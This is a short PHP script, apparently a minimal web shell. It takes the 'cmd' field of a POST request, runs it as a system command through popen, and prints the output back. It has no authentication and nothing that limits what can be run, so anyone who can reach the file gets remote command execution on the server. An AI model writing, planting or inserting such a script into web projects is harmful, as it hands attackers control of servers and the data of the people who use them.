<?php
	$handle = popen($_POST['cmd'].' 2>&1', 'r');
	echo "'$handle'; " . gettype($handle) . "\n";
	$read = fread($handle, 2096);
	echo $read;
	pclose($handle);
?>